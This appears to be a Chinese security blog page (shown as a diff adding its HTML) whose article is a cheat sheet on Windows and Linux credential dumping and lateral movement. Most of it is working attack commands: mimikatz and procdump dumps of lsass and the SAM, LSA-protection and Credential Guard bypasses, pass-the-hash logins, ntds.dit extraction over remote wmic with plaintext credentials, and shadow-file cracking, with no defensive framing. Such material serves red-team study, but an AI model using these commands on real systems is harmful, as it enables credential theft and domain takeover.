@@ -1,0 +1,1384 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="内网渗透-凭据获取+横向渗透, 二层楼">
+    <meta name="description" content="荒原初见，悠悠我心，雪夜红墙，要你欢喜">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>内网渗透-凭据获取+横向渗透 | 二层楼</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="二层楼" type="application/atom+xml">
+</head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/dao1.jpeg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">二层楼</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>Medias</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a target="_blank" rel="noopener" href="http://www.gequdaquan.net/gqss/">
+          
+          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Musics</span>
+        </a>
+      </li>
+      
+      <li>
+        <a target="_blank" rel="noopener" href="https://www.duboku.tv/">
+          
+          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Movies</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/dao1.jpeg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">二层楼</div>
+        <div class="logo-desc">
+            
+            荒原初见，悠悠我心，雪夜红墙，要你欢喜
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			Medias
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a target="_blank" rel="noopener" href="http://www.gequdaquan.net/gqss/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Musics</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a target="_blank" rel="noopener" href="https://www.duboku.tv/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Movies</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/thirteensummer" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>welcome to 二层楼----世界
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/thirteensummer" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="welcome to 二层楼----世界" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = 'ad0697f382dbc64a401102ff3103ef3bc5a93d73cf8728a5b3b75ca7f3a6dcf5';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('这是高级进阶博客，只属于定制（欢迎破解，加入13summer-Team），请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">内网渗透-凭据获取+横向渗透</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%8A%A0%E5%AF%86-hasdes-123/">
+                                <span class="chip bg-color">加密 hasdes@123</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-06-22
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">收集用户明文密码以及Hash</span><br><span class="line">横向常用工具</span><br><span class="line">收集第三方密码及Hash</span><br><span class="line">传统键盘记录</span><br><span class="line">Bypass List</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="收集用户明文密码及Hash"><a href="#收集用户明文密码及Hash" class="headerlink" title="收集用户明文密码及Hash"></a>收集用户明文密码及Hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在线拖Hash姿势</span><br><span class="line">离线拖Hash姿势</span><br><span class="line">Bypass XXX List</span><br><span class="line">net-NTLM Hash利用</span><br><span class="line">Linux Hash</span><br><span class="line">域Hash拖取姿势</span><br><span class="line">Hash破解姿势</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="在线拖Hash姿势"><a href="#在线拖Hash姿势" class="headerlink" title="在线拖Hash姿势"></a>在线拖Hash姿势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、SAM</span><br><span class="line">(1) mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">token::whoami</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line">(2) ps1</span><br><span class="line">Invoke-PowerDump.ps1</span><br><span class="line">2、lsass.exe</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="离线拖Hash姿势"><a href="#离线拖Hash姿势" class="headerlink" title="离线拖Hash姿势"></a>离线拖Hash姿势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.SAM</span><br><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br><span class="line">NinjaCopy</span><br><span class="line">2.lsass.exe</span><br><span class="line">procdump.exe -accepteula (-54) -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;comsvcs.dll</span><br><span class="line">见comsvcs.vbs</span><br><span class="line">Outflank-Dumpert</span><br><span class="line">Outflank-Dumpert.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="提取lsass-exe-Tips"><a href="#提取lsass-exe-Tips" class="headerlink" title="提取lsass.exe Tips"></a>提取lsass.exe Tips</h5><p>开启Wdigest Auth</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v</span><br><span class="line">UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">Set-ItemProperty -Path</span><br><span class="line">HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name</span><br><span class="line">UseLogonCredential -Type DWORD -Value 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Bypass-LSA-Protection"><a href="#Bypass-LSA-Protection" class="headerlink" title="Bypass LSA Protection"></a>Bypass LSA Protection</h5><p><img src="/images/pasted-55.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">防止对 lsass.exe 注入</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">Bypass (1)</span><br><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">Bypass (2)</span><br><span class="line">privilege::debug</span><br><span class="line">token::whoami</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Bypass-KB2871997"><a href="#Bypass-KB2871997" class="headerlink" title="Bypass KB2871997"></a>Bypass KB2871997</h5><p>WDigest SSP</p>
+<h5 id="Bypass-Restricted-Administrator-Mode"><a href="#Bypass-Restricted-Administrator-Mode" class="headerlink" title="Bypass Restricted Administrator Mode"></a>Bypass Restricted Administrator Mode</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Bypass (1)</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:remoteserver</span><br><span class="line">&#x2F;ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;&#x2F;run:mstsc.exe &#x2F;restictedadmin&quot;</span><br><span class="line">Bypass (2)</span><br><span class="line">xfreerdp &#x2F;u:administrator &#x2F;p:test123! &#x2F;v:192.168.62.136 &#x2F;cert-ignore</span><br><span class="line">xfreerdp &#x2F;u:administrator &#x2F;pth:d25ecd13fddbb542d2e16da4f9e0333d &#x2F;v:192.168.62.136 &#x2F;cert-</span><br><span class="line">ignore</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Bypass-Credential-Guard"><a href="#Bypass-Credential-Guard" class="headerlink" title="Bypass Credential Guard"></a>Bypass Credential Guard</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows 10和Windows Server 2016启用</span><br><span class="line">Bypass (1)</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::whoami</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">Bypass (2): memssp</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br><span class="line">Bypass (3) : NetNTLM Downgrade Attack</span><br><span class="line">InternalMonologue.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Bypass-LAPS"><a href="#Bypass-LAPS" class="headerlink" title="Bypass LAPS"></a>Bypass LAPS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LAPSToolkit</span><br><span class="line">查询由系统管理员指定的用户组,查找具有“全部扩展权限”的用户(可查看密码),而且还可以查看全</span><br><span class="line">部启用了LAPS的计算机设备</span><br><span class="line">ms-MCS-AdmPwd &#x2F;&#x2F;存储密码</span><br><span class="line">ms-MCS-AdmPwdExpiration Time &#x2F;&#x2F;存储过期时间</span><br><span class="line">Get-LAPSComputers &#x2F;&#x2F;显示所有启用了LAPS,密码有效期和密码(如果用户有权访问)的计算机</span><br><span class="line">Find-LAPSDelegatedGroups &#x2F;&#x2F;搜素所有OU,以查看哪些AD组可以读取ms-Mcs-AdmPwd属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Shadow"><a href="#Shadow" class="headerlink" title="Shadow"></a>Shadow</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;shadow$id$salt@encrypted</span><br><span class="line">root:$6$LlczSMShZXNDgc&#x2F;E$VTBWqUeNCcMw5c0hlTsqXSiUSGYKv9xiusrG71Trs&#x2F;&#x2F;6mqh.vcOpUbS</span><br><span class="line">Yw9CwOQn2dkQrkHI2Z.xCu2d4Q5ur6&#x2F;:18251:0:99999:7:::</span><br><span class="line">id为1时,采用md5算法加密</span><br><span class="line">id为5时,采用SHA256算法加密</span><br><span class="line">id为6时,采用SHA512算法加密</span><br><span class="line">破解</span><br><span class="line">.&#x2F;unshadow &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow &gt; password.txt</span><br><span class="line">.&#x2F;john password.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="域Hash拖取姿势"><a href="#域Hash拖取姿势" class="headerlink" title="域Hash拖取姿势"></a>域Hash拖取姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取ntds.dit</span><br><span class="line">1、Volume Shadow Copy</span><br><span class="line">ntdsutil</span><br><span class="line">vssadmin</span><br><span class="line">vshadow.exe</span><br><span class="line">vssown.vbs</span><br><span class="line">2、Invoke-NinjaCopy.ps1</span><br><span class="line">解析ntds.dit</span><br><span class="line">mimikatz (Dcsync&amp;inject lsass)</span><br><span class="line">一键拖Hash (vshadow.exe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="域Hash拖取姿势-1"><a href="#域Hash拖取姿势-1" class="headerlink" title="域Hash拖取姿势"></a>域Hash拖取姿势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">获取ntds.dit2、Invoke-NinjaCopy.ps1</span><br><span class="line">原理</span><br><span class="line">Bypass SACL</span><br><span class="line">Bypass Open Run File</span><br><span class="line">Bypass DACL</span><br><span class="line">操作</span><br><span class="line">import-module Invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path &quot;c:\Windows\ntds\ntds.dit&quot; -LocalDestination &quot;c:\ntds.dit&quot;</span><br><span class="line">esentutl &#x2F;p &#x2F;o ntds.dit</span><br><span class="line">Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;RDLABDC02&quot;</span><br><span class="line">LocalDestination &quot;c:\temp\ntds.dit&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="域Hash拖取姿势-一键导出"><a href="#域Hash拖取姿势-一键导出" class="headerlink" title="域Hash拖取姿势 - 一键导出"></a>域Hash拖取姿势 - 一键导出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe+QuarksPwDump.exe</span><br><span class="line">注:修改WORK_PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h6 id="域Hash拖取姿势-Tips"><a href="#域Hash拖取姿势-Tips" class="headerlink" title="域Hash拖取姿势 - Tips"></a>域Hash拖取姿势 - Tips</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">远程导出</span><br><span class="line">wmic &#x2F;node:AD &#x2F;user:PENTEST\Administrator &#x2F;password:Aa123456@ process call create</span><br><span class="line">&quot;cmd &#x2F;c vssadmin create shadow &#x2F;for&#x3D;c: 2&gt;&amp;1 &gt; c:&#x2F;vss.log&quot;wmic &#x2F;node:AD &#x2F;user:PENTEST\administrator &#x2F;password:Aa123456@ process call create</span><br><span class="line">&quot;cmd &#x2F;c copy VSS ID&#x2F;Windows&#x2F;NTDS&#x2F;NTDS.dit C:&#x2F;windows&#x2F;temp&#x2F;NTDS.dit 2&gt;&amp;1&quot;</span><br><span class="line">wmic &#x2F;node:AD &#x2F;user:PENTESTadministrator &#x2F;password:Aa123456@ process call create</span><br><span class="line">&quot;cmd &#x2F;c copy VSS ID&#x2F;Windows&#x2F;System32&#x2F;config&#x2F;SYSTEM c:&#x2F;windows&#x2F;temp&#x2F;SYSTEM.hive</span><br><span class="line">2&gt;&amp;1&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="域Hash拖取姿势-Misc"><a href="#域Hash拖取姿势-Misc" class="headerlink" title="域Hash拖取姿势 - Misc"></a>域Hash拖取姿势 - Misc</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf</span><br><span class="line">windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump</span><br><span class="line">auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrab</span><br><span class="line">Empire</span><br><span class="line">usemodule credentials&#x2F;mimikatz&#x2F;dcsync_hashdump</span><br><span class="line">Nishang</span><br><span class="line">Copy-VSS.ps1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="收集第三方密码及Hash"><a href="#收集第三方密码及Hash" class="headerlink" title="收集第三方密码及Hash"></a>收集第三方密码及Hash</h5><ul>
+<li>收集用户配置中收集明文密码</li>
+<li>从用户数据库中收集保存密码</li>
+<li>抓取常用软件明文密码</li>
+</ul>
+<h5 id="抓取常用软件明文密码"><a href="#抓取常用软件明文密码" class="headerlink" title="抓取常用软件明文密码"></a>抓取常用软件明文密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Chrome等浏览器</span><br><span class="line">Navicat</span><br><span class="line">FTP</span><br><span class="line">Outlook</span><br><span class="line">SVN</span><br><span class="line">WIFI</span><br><span class="line"></span><br></pre></td></tr></table></figure>
